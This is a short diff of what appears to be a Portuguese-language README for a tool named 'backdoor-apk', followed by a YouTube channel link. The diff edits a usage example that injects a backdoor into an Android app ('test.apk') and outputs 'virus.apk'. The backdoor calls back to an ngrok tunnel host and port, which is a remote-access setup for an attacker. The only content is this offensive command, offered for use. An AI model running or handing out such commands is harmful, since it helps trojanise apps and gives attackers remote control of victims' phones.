@@ -17,6 +17,6 @@ Host/DDNS:
 
 Ngrok:
 
-./backdoor-apk -n test.apk xxxx.ngok.io xxxx 9090 virus.apk
+./backdoor-apk -n test.apk xxxx 9090 virus.apk
 
 Meu canal no YT: https://www.youtube.com/channel/UC_0YeOjcY-d_Tq0Kvcf4CKg
